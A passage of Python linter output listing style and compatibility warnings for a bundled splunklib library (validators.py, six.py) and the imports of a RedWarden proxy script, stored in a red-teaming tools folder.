208 |                       )
209 |                   return
    |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:205:25
    |
203 |                   if value > maximum:
204 |                       raise ValueError(
205 | /                         "Expected integer in the range [-Γê₧,{0}], not {1}".format(
206 | |                             maximum, value
207 | |                         )
    | |_________________________^
208 |                       )
209 |                   return
    |
help: Convert to f-string

SIM108 Use ternary operator `value = long(value) if six.PY2 else int(value)` instead of `if`-`else`-block
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:223:13
    |
221 |               return None
222 |           try:
223 | /             if six.PY2:
224 | |                 value = long(value)
225 | |             else:
226 | |                 value = int(value)
    | |__________________________________^
227 |           except ValueError:
228 |               raise ValueError(
    |
help: Replace `if`-`else`-block with `value = long(value) if six.PY2 else int(value)`

F821 Undefined name `long`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:224:25
    |
222 |         try:
223 |             if six.PY2:
224 |                 value = long(value)
    |                         ^^^^
225 |             else:
226 |                 value = int(value)
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:228:13
    |
226 |                   value = int(value)
227 |           except ValueError:
228 | /             raise ValueError(
229 | |                 "Expected integer value, not {}".format(json_encode_string(value))
230 | |             )
    | |_____________^
231 |
232 |           self.check_range(value)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:229:17
    |
227 |         except ValueError:
228 |             raise ValueError(
229 |                 "Expected integer value, not {}".format(json_encode_string(value))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
230 |             )
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:260:13
    |
258 |                 result = 3600 * _unsigned(p[0]) + 60 * _60(p[1]) + _60(p[2])
259 |         except ValueError:
260 |             raise ValueError("Invalid duration value: {0}".format(value))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
261 |
262 |         return result
    |

UP030 Use implicit references for positional format fields
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:260:30
    |
258 |                 result = 3600 * _unsigned(p[0]) + 60 * _60(p[1]) + _60(p[2])
259 |         except ValueError:
260 |             raise ValueError("Invalid duration value: {0}".format(value))
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
261 |
262 |         return result
    |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:260:30
    |
258 |                 result = 3600 * _unsigned(p[0]) + 60 * _60(p[1]) + _60(p[2])
259 |         except ValueError:
260 |             raise ValueError("Invalid duration value: {0}".format(value))
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
261 |
262 |         return result
    |
help: Convert to f-string

UP030 Use implicit references for positional format fields
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:275:16
    |
273 |         h = value // (60 * 60)
274 |
275 |         return "{0:02d}:{1:02d}:{2:02d}".format(h, m, s)
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
276 |
277 |     _60 = Integer(0, 59)
    |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:275:16
    |
273 |         h = value // (60 * 60)
274 |
275 |         return "{0:02d}:{1:02d}:{2:02d}".format(h, m, s)
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
276 |
277 |     _60 = Integer(0, 59)
    |
help: Convert to f-string

UP018 [*] Unnecessary `str` call (rewrite as a literal)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:288:21
    |
287 |         strict = True
288 |         delimiter = str(",")
    |                     ^^^^^^^^
289 |         quotechar = str('"')
290 |         doublequote = True
    |
help: Replace with string literal

UP018 [*] Unnecessary `str` call (rewrite as a literal)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:289:21
    |
287 |         strict = True
288 |         delimiter = str(",")
289 |         quotechar = str('"')
    |                     ^^^^^^^^
290 |         doublequote = True
291 |         lineterminator = str("\n")
    |
help: Replace with string literal

UP018 [*] Unnecessary `str` call (rewrite as a literal)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:291:26
    |
289 |         quotechar = str('"')
290 |         doublequote = True
291 |         lineterminator = str("\n")
    |                          ^^^^^^^^^
292 |         skipinitialspace = True
293 |         quoting = csv.QUOTE_MINIMAL
    |
help: Replace with string literal

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:311:13
    |
309 |             value = next(csv.reader([value], self.Dialect))
310 |         except csv.Error as error:
311 |             raise ValueError(error)
    |             ^^^^^^^^^^^^^^^^^^^^^^^
312 |
313 |         if self._validator is None:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:320:13
    |
318 |                 value[index] = self._validator(item)
319 |         except ValueError as error:
320 |             raise ValueError("Could not convert item {}: {}".format(index, error))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
321 |
322 |         return value
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:320:30
    |
318 |                 value[index] = self._validator(item)
319 |         except ValueError as error:
320 |             raise ValueError("Could not convert item {}: {}".format(index, error))
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
321 |
322 |         return value
    |
help: Convert to f-string

UP030 Use implicit references for positional format fields
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:346:30
    |
345 |         if value not in self.membership:
346 |             raise ValueError("Unrecognized value: {0}".format(value))
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
347 |
348 |         return self.membership[value]
    |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:346:30
    |
345 |         if value not in self.membership:
346 |             raise ValueError("Unrecognized value: {0}".format(value))
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
347 |
348 |         return self.membership[value]
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:373:17
    |
371 |         if self.pattern.match(value) is None:
372 |             raise ValueError(
373 |                 "Expected {}, not {}".format(self.name, json_encode_string(value))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
374 |             )
375 |         return value
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:390:34
    |
388 |             value = six.text_type(value)
389 |             if OptionName.pattern.match(value) is None:
390 |                 raise ValueError("Illegal characters in option name: {}".format(value))
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
391 |         return value
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:406:13
    |
404 |             value = re.compile(six.text_type(value))
405 |         except re.error as error:
406 |             raise ValueError("{}: {}".format(six.text_type(error).capitalize(), value))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
407 |         return value
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:406:30
    |
404 |             value = re.compile(six.text_type(value))
405 |         except re.error as error:
406 |             raise ValueError("{}: {}".format(six.text_type(error).capitalize(), value))
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
407 |         return value
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\validators.py:424:30
    |
422 |         value = six.text_type(value)
423 |         if value not in self.membership:
424 |             raise ValueError("Unrecognized value: {}".format(value))
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
425 |         return value
    |
help: Convert to f-string

UP010 [*] Unnecessary `__future__` import `absolute_import` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:23:1
   |
21 | # SOFTWARE.
22 |
23 | from __future__ import absolute_import
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | import functools
   |
help: Remove unnecessary `__future__` import

F821 Undefined name `basestring`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:49:21
   |
47 |     MAXSIZE = sys.maxsize
48 | else:
49 |     string_types = (basestring,)
   |                     ^^^^^^^^^^
50 |     integer_types = (int, long)
51 |     class_types = (type, types.ClassType)
   |

F821 Undefined name `long`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:50:27
   |
48 | else:
49 |     string_types = (basestring,)
50 |     integer_types = (int, long)
   |                           ^^^^
51 |     class_types = (type, types.ClassType)
52 |     text_type = unicode
   |

F821 Undefined name `unicode`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:52:17
   |
50 |     integer_types = (int, long)
51 |     class_types = (type, types.ClassType)
52 |     text_type = unicode
   |                 ^^^^^^^
53 |     binary_type = str
   |

UP004 [*] Class `X` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:60:17
   |
58 |     else:
59 |         # It's possible to have sizeof(long) != sizeof(Py_ssize_t).
60 |         class X(object):
   |                 ^^^^^^
61 |
62 |             def __len__(self):
   |
help: Remove `object` inheritance

UP004 [*] Class `_LazyDescr` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:87:18
   |
87 | class _LazyDescr(object):
   |                  ^^^^^^
88 |
89 |     def __init__(self, name):
   |
help: Remove `object` inheritance

UP008 [*] Use `super()` instead of `super(__class__, self)`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:107:14
    |
106 |     def __init__(self, name, old, new=None):
107 |         super(MovedModule, self).__init__(name)
    |              ^^^^^^^^^^^^^^^^^^^
108 |         if PY3:
109 |             if new is None:
    |
help: Remove `super()` parameters

UP008 [*] Use `super()` instead of `super(__class__, self)`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:128:14
    |
127 |     def __init__(self, name):
128 |         super(_LazyModule, self).__init__(name)
    |              ^^^^^^^^^^^^^^^^^^^
129 |         self.__doc__ = self.__class__.__doc__
    |
help: Remove `super()` parameters

UP008 [*] Use `super()` instead of `super(__class__, self)`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:143:14
    |
142 |     def __init__(self, name, old_mod, new_mod, old_attr=None, new_attr=None):
143 |         super(MovedAttribute, self).__init__(name)
    |              ^^^^^^^^^^^^^^^^^^^^^^
144 |         if PY3:
145 |             if new_mod is None:
    |
help: Remove `super()` parameters

SIM108 Use ternary operator `new_attr = name if old_attr is None else old_attr` instead of `if`-`else`-block
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:149:17
    |
147 |               self.mod = new_mod
148 |               if new_attr is None:
149 | /                 if old_attr is None:
150 | |                     new_attr = name
151 | |                 else:
152 | |                     new_attr = old_attr
    | |_______________________________________^
153 |               self.attr = new_attr
154 |           else:
    |
help: Replace `if`-`else`-block with `new_attr = name if old_attr is None else old_attr`

UP004 [*] Class `_SixMetaPathImporter` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:165:28
    |
165 | class _SixMetaPathImporter(object):
    |                            ^^^^^^
166 |     """
167 |     A meta path importer to import six.moves and its submodules.
    |
help: Remove `object` inheritance

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:193:13
    |
191 |             return self.known_modules[fullname]
192 |         except KeyError:
193 |             raise ImportError("This loader does not know module " + fullname)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
194 |
195 |     def load_module(self, fullname):
    |

N801 Class name `Module_six_moves_urllib_parse` should use CapWords convention
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:327:7
    |
327 | class Module_six_moves_urllib_parse(_LazyModule):
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
328 |     """Lazy loading of moved objects in six.moves.urllib_parse"""
    |

N801 Class name `Module_six_moves_urllib_error` should use CapWords convention
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:369:7
    |
369 | class Module_six_moves_urllib_error(_LazyModule):
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
370 |     """Lazy loading of moved objects in six.moves.urllib_error"""
    |

N801 Class name `Module_six_moves_urllib_request` should use CapWords convention
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:391:7
    |
391 | class Module_six_moves_urllib_request(_LazyModule):
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
392 |     """Lazy loading of moved objects in six.moves.urllib_request"""
    |

N801 Class name `Module_six_moves_urllib_response` should use CapWords convention
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:443:7
    |
443 | class Module_six_moves_urllib_response(_LazyModule):
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
444 |     """Lazy loading of moved objects in six.moves.urllib_response"""
    |

N801 Class name `Module_six_moves_urllib_robotparser` should use CapWords convention
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:466:7
    |
466 | class Module_six_moves_urllib_robotparser(_LazyModule):
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
467 |     """Lazy loading of moved objects in six.moves.urllib_robotparser"""
    |

N801 Class name `Module_six_moves_urllib` should use CapWords convention
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:488:7
    |
488 | class Module_six_moves_urllib(types.ModuleType):
    |       ^^^^^^^^^^^^^^^^^^^^^^^
489 |     """Create a six.moves.urllib namespace that resembles the Python 3 namespace"""
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:520:13
    |
518 |             del moves.__dict__[name]
519 |         except KeyError:
520 |             raise AttributeError("no such move, %r" % (name,))
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:520:34
    |
518 |             del moves.__dict__[name]
519 |         except KeyError:
520 |             raise AttributeError("no such move, %r" % (name,))
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Replace with format specifiers

UP004 [*] Class `Iterator` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:582:20
    |
580 |         return types.MethodType(func, None, cls)
581 |
582 |     class Iterator(object):
    |                    ^^^^^^
583 |
584 |         def next(self):
    |
help: Remove `object` inheritance

N816 Variable `_assertCountEqual` in global scope should not be mixedCase
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:668:5
    |
666 |     StringIO = io.StringIO
667 |     BytesIO = io.BytesIO
668 |     _assertCountEqual = "assertCountEqual"
    |     ^^^^^^^^^^^^^^^^^
669 |     if sys.version_info[1] <= 1:
670 |         _assertRaisesRegex = "assertRaisesRegexp"
    |

N816 Variable `_assertRaisesRegex` in global scope should not be mixedCase
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:670:9
    |
668 |     _assertCountEqual = "assertCountEqual"
669 |     if sys.version_info[1] <= 1:
670 |         _assertRaisesRegex = "assertRaisesRegexp"
    |         ^^^^^^^^^^^^^^^^^^
671 |         _assertRegex = "assertRegexpMatches"
672 |     else:
    |

N816 Variable `_assertRegex` in global scope should not be mixedCase
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:671:9
    |
669 |     if sys.version_info[1] <= 1:
670 |         _assertRaisesRegex = "assertRaisesRegexp"
671 |         _assertRegex = "assertRegexpMatches"
    |         ^^^^^^^^^^^^
672 |     else:
673 |         _assertRaisesRegex = "assertRaisesRegex"
    |

N816 Variable `_assertRaisesRegex` in global scope should not be mixedCase
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:673:9
    |
671 |         _assertRegex = "assertRegexpMatches"
672 |     else:
673 |         _assertRaisesRegex = "assertRaisesRegex"
    |         ^^^^^^^^^^^^^^^^^^
674 |         _assertRegex = "assertRegex"
675 | else:
    |

N816 Variable `_assertRegex` in global scope should not be mixedCase
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:674:9
    |
672 |     else:
673 |         _assertRaisesRegex = "assertRaisesRegex"
674 |         _assertRegex = "assertRegex"
    |         ^^^^^^^^^^^^
675 | else:
    |

F821 Undefined name `unicode`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:683:16
    |
682 |     def u(s):
683 |         return unicode(s.replace(r"\\", r"\\\\"), "unicode_escape")
    |                ^^^^^^^
684 |
685 |     unichr = unichr
    |

N816 Variable `_assertCountEqual` in global scope should not be mixedCase
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:698:5
    |
697 |     StringIO = BytesIO = StringIO.StringIO
698 |     _assertCountEqual = "assertItemsEqual"
    |     ^^^^^^^^^^^^^^^^^
699 |     _assertRaisesRegex = "assertRaisesRegexp"
700 |     _assertRegex = "assertRegexpMatches"
    |

N816 Variable `_assertRaisesRegex` in global scope should not be mixedCase
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:699:5
    |
697 |     StringIO = BytesIO = StringIO.StringIO
698 |     _assertCountEqual = "assertItemsEqual"
699 |     _assertRaisesRegex = "assertRaisesRegexp"
    |     ^^^^^^^^^^^^^^^^^^
700 |     _assertRegex = "assertRegexpMatches"
701 | _add_doc(b, """Byte literal""")
    |

N816 Variable `_assertRegex` in global scope should not be mixedCase
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:700:5
    |
698 |     _assertCountEqual = "assertItemsEqual"
699 |     _assertRaisesRegex = "assertRaisesRegexp"
700 |     _assertRegex = "assertRegexpMatches"
    |     ^^^^^^^^^^^^
701 | _add_doc(b, """Byte literal""")
702 | _add_doc(u, """Text literal""")
    |

B009 [*] Do not call `getattr` with a constant attribute value. It is not any safer than normal property access.
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:718:13
    |
717 | if PY3:
718 |     exec_ = getattr(moves.builtins, "exec")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
719 |
720 |     def reraise(tp, value, tb=None):
    |
help: Replace `getattr` with attribute access

UP036 Version block is outdated for minimum Python version
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:756:6
    |
754 | """
755 |     )
756 | elif sys.version_info[:2] > (3, 2):
    |      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
757 |     exec_(
758 |         """def raise_from(value, from_value):
    |
help: Remove outdated version block

F821 Undefined name `basestring`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:778:37
    |
777 |         def write(data):
778 |             if not isinstance(data, basestring):
    |                                     ^^^^^^^^^^
779 |                 data = str(data)
780 |             # If the file has an encoding, encode unicode with it.
    |

F821 Undefined name `file`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:782:32
    |
780 |             # If the file has an encoding, encode unicode with it.
781 |             if (
782 |                 isinstance(fp, file)
    |                                ^^^^
783 |                 and isinstance(data, unicode)
784 |                 and fp.encoding is not None
    |

F821 Undefined name `unicode`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:783:38
    |
781 |             if (
782 |                 isinstance(fp, file)
783 |                 and isinstance(data, unicode)
    |                                      ^^^^^^^
784 |                 and fp.encoding is not None
785 |             ):
    |

F821 Undefined name `unicode`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:795:32
    |
793 |         sep = kwargs.pop("sep", None)
794 |         if sep is not None:
795 |             if isinstance(sep, unicode):
    |                                ^^^^^^^
796 |                 want_unicode = True
797 |             elif not isinstance(sep, str):
    |

F821 Undefined name `unicode`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:801:32
    |
799 |         end = kwargs.pop("end", None)
800 |         if end is not None:
801 |             if isinstance(end, unicode):
    |                                ^^^^^^^
802 |                 want_unicode = True
803 |             elif not isinstance(end, str):
    |

F821 Undefined name `unicode`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:809:36
    |
807 |         if not want_unicode:
808 |             for arg in args:
809 |                 if isinstance(arg, unicode):
    |                                    ^^^^^^^
810 |                     want_unicode = True
811 |                     break
    |

F821 Undefined name `unicode`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:813:23
    |
811 |                     break
812 |         if want_unicode:
813 |             newline = unicode("\n")
    |                       ^^^^^^^
814 |             space = unicode(" ")
815 |         else:
    |

F821 Undefined name `unicode`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:814:21
    |
812 |         if want_unicode:
813 |             newline = unicode("\n")
814 |             space = unicode(" ")
    |                     ^^^^^^^
815 |         else:
816 |             newline = "\n"
    |

UP036 Version block is outdated for minimum Python version
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:829:4
    |
829 | if sys.version_info[:2] < (3, 3):
    |    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
830 |     _print = print_
    |
help: Remove outdated version block

UP036 Version block is outdated for minimum Python version
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:842:4
    |
840 | _add_doc(reraise, """Reraise an exception.""")
841 |
842 | if sys.version_info[0:2] < (3, 4):
    |    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
843 |
844 |     def wraps(
    |
help: Remove outdated version block

N801 Class name `metaclass` should use CapWords convention
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:866:11
    |
864 |     # metaclass for one level of class instantiation that replaces itself with
865 |     # the actual metaclass.
866 |     class metaclass(meta):
    |           ^^^^^^^^^
867 |
868 |         def __new__(cls, name, this_bases, d):
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\six.py:903:17
    |
901 |           if "__str__" not in klass.__dict__:
902 |               raise ValueError(
903 | /                 "@python_2_unicode_compatible cannot be applied "
904 | |                 "to %s because it doesn't define __str__()." % klass.__name__
    | |_____________________________________________________________________________^
905 |               )
906 |           klass.__unicode__ = klass.__str__
    |
help: Replace with format specifiers

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | #
4 | # RedWarden
  |
help: Remove unnecessary coding comment

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:40:1
   |
38 | VERSION = "0.9.1"
39 |
40 | import asyncio
   | ^^^^^^^^^^^^^^
41 | import logging
42 | import os
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:41:1
   |
40 | import asyncio
41 | import logging
   | ^^^^^^^^^^^^^^
42 | import os
43 | import sys
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:42:1
   |
40 | import asyncio
41 | import logging
42 | import os
   | ^^^^^^^^^
43 | import sys
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:43:1
   |
41 | import logging
42 | import os
43 | import sys
   | ^^^^^^^^^^
44 |
45 | import tornado.httpserver
   |

F401 [*] `sys` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:43:8
   |
41 | import logging
42 | import os
43 | import sys
   |        ^^^
44 |
45 | import tornado.httpserver
   |
help: Remove unused import: `sys`

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:45:1
   |
43 | import sys
44 |
45 | import tornado.httpserver
   | ^^^^^^^^^^^^^^^^^^^^^^^^^
46 | import tornado.netutil
47 | import tornado.web
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:46:1
   |
45 | import tornado.httpserver
46 | import tornado.netutil
   | ^^^^^^^^^^^^^^^^^^^^^^
47 | import tornado.web
48 | from lib.proxyhandler import *
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:47:1
   |
45 | import tornado.httpserver
46 | import tornado.netutil
47 | import tornado.web
   | ^^^^^^^^^^^^^^^^^^
48 | from lib.proxyhandler import *
49 | from lib.proxylogger import ProxyLogger
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:48:1
   |
46 | import tornado.netutil
47 | import tornado.web
48 | from lib.proxyhandler import *
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
49 | from lib.proxylogger import ProxyLogger
   |

F403 `from lib.proxyhandler import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:48:1
   |
46 | import tornado.netutil
47 | import tornado.web
48 | from lib.proxyhandler import *
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
49 | from lib.proxylogger import ProxyLogger
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:49:1
   |
47 | import tornado.web
48 | from lib.proxyhandler import *
49 | from lib.proxylogger import ProxyLogger
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
50 |
51 | normpath = lambda p: os.path.normpath(
   |

E731 Do not assign a `lambda` expression, use a `def`
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:51:1
   |
49 |   from lib.proxylogger import ProxyLogger
50 |
51 | / normpath = lambda p: os.path.normpath(
52 | |     os.path.join(os.path.dirname(os.path.realpath(__file__)), p)
53 | | )
   | |_^
   |
help: Rewrite `normpath` as a `def`

F405 `ssl` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:90:15
   |
89 | def create_ssl_context():
90 |     ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
   |               ^^^
91 |     ssl_ctx.load_cert_chain(options["cacert"], options["cakey"])
   |

F405 `ssl` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:90:42
   |
